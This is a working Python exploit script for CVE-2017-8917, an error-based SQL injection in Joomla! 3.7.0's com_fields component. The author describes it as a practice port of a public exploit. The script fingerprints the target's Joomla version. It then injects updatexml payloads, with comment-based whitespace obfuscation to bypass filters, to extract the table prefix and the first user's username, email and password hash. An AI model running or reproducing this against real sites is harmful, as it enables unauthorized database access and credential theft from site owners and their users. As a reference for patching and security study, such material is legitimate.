# Joomla! 3.7.0 SQLi PoC
# CVE-2017-8917 (https://nvd.nist.gov/vuln/detail/CVE-2017-8917)
#
# This script can check the target Joomla! version. If the target is vulnerable, the script can exploit it to dump the first user's username, email, and password from joomla database
#
# I wrote this code just for practice. It is a python version of the code in https://www.exploit-db.com/exploits/44227, with a few improvements, such as a way to check the Joomla! version running.
#
# author: @davimoreno
#

import argparse
import re
import requests

def print_good(msg):
    print(f"\033[92m[+] {msg}\033[0m")

def print_bad(msg):
    print(f"\033[91m[-] {msg}\033[0m")

def sqli(target, payload):
    # Function responsible to do all SQLi requests, and return the command responses
    base_url = target + '/' + "index.php?option=com_fields&view=fields&layout=modal&list[fullordering]="
    
    # Bypass some SQL filters
    # "/**/" is just an obfuscated whitespace trick
    payload = payload.replace(' ', "/**/")
    
    url = base_url + f"updatexml(1,concat(0x3a3a,({payload}),0x3a3a),1)"

    response = requests.get(url)

    # Regex to get SQLi response
    regex_pattern = r'<title>.*::(.*)::.*<\/title>'

    if (response.status_code == 500):
        match = re.search(regex_pattern, response.text)
        if match:
            sqli_response = match.group(1) 
            #print(f"Command response: {sqli_response}")
            return sqli_response

def exploit(target):
    # Exploit target to dump first username, email, and password from table _users
    table_prefix = get_table_prefix(target)
    username = get_username(target, table_prefix)
    email = get_email(target, table_prefix)
    password = get_password(target, table_prefix)
    
    if (username or email or password):
        print_good(f"First user in users table has\n"
                   f"   Username: {username if username else ""}\n"
                   f"   Email: {email if email else ""}\n"
                   f"   Password: {password if password else ""}")
    else:
        print_bad("Could not dump content from users table")
    
def get_password(target, table_prefix):
    # Get first user password in table _users    
    offset = 1
    password = ""
    
    while(1):
        payload = f"SELECT substring(password,{offset},10) FROM joomla.{table_prefix}_users LIMIT 0,1"
        sqli_response = sqli(target, payload)
        offset += 10
        
        if sqli_response:
            password += sqli_response
        else:
            break
    #print(f"Password is {password}")
    return password

def get_email(target, table_prefix):
    # Get first user email in table _users    
    offset = 1
    email = ""
    
    while(1):
        payload = f"SELECT substring(email,{offset},10) FROM joomla.{table_prefix}_users LIMIT 0,1"
        sqli_response = sqli(target, payload)
        offset += 10
        
        if sqli_response:
            email += sqli_response
        else:
            break
    #print(f"Email is {email}")
    return email

def get_username(target, table_prefix):
    # Get first username in table _users    
    offset = 1
    username = ""
    
    while(1):
        payload = f"SELECT substring(username,{offset},10) FROM joomla.{table_prefix}_users LIMIT 0,1"
        sqli_response = sqli(target, payload)
        offset += 10
        
        if sqli_response:
            username += sqli_response
        else:
            break
    #print(f"Username is {username}")
    return username

def get_table_prefix(target):
    # In Joomla! the table names have a prefix (e.g. ab6g3_users table has prefix ab6g3)
    # Here we query a table to obtain this prefix value
    
    payload = "SELECT hex(table_name) FROM information_schema.tables WHERE table_schema=0x6a6f6f6d6c61 LIMIT 0,1"
    sqli_response = sqli(target, payload)
    
    if sqli_response:
        table_name = bytes.fromhex(sqli_response).decode()
        table_prefix = table_name.split('_')[0]
        print_good(f"Found table prefix {table_prefix}")
        return table_prefix
 
def get_version(target):
    # We look for the tag <version> in the response
    regex_pattern = r'<version>.*(\d+\.\d+\.\d+).*</version>'
    
    # First test is to try to access "/administrator/manifests/files/joomla.xml" 
    url = target + '/' + "/administrator/manifests/files/joomla.xml"
    response = requests.get(url)
    
    if (response.status_code == 200):
        match = re.search(regex_pattern, response.text)
        if match:
            version = match.group(1) 
            #print(f"Target is running Joomla! {version}")
            return version
    
    # If the first test fails, the second test is executed
    # Second test is to try to access "/language/en-GB/en-GB.xml"
    url = target + '/' + "/language/en-GB/en-GB.xml"
    response = requests.get(url)
    
    if (response.status_code == 200):
        match = re.search(regex_pattern, response.text)
        if match:
            version = match.group(1) 
            #print(f"Target is running Joomla! {version}")
            return version

def is_version_vulnerable(version):
    return (version == "3.7.0")

def get_arguments():
    description_program = "Joomla! 3.7.0 SQLi via \"com_fields\" parameter"
    help_param_url = "The URL to the Joomla! webserver" 
    help_param_check = "Checks if given URL is vulnerable"

    parser = argparse.ArgumentParser(description=description_program)
    parser.add_argument("-u", "--url", required=True, help=help_param_url)
    parser.add_argument("-c", "--check", required=False, action="store_true", help=help_param_check)

    args = parser.parse_args()

    return args

def main():
    args = get_arguments();
    target = args.url
    version = get_version(target)

    if version:
        print_good(f"Found Joomla! {version} running")
        if is_version_vulnerable(version):
            print_good(f"This version is vulnerable")
        else:
            print_bad(f"This version is NOT vulnerable")
    else:
        print_bad("Could not determine Joomla! version")


    if (args.check):
        # If --check flag is specified, just return
        return
    else:
        if version and is_version_vulnerable(version):
            # If Joomla! is vulnerable try to exploit it
            exploit(target)

if __name__ == "__main__":
    main()
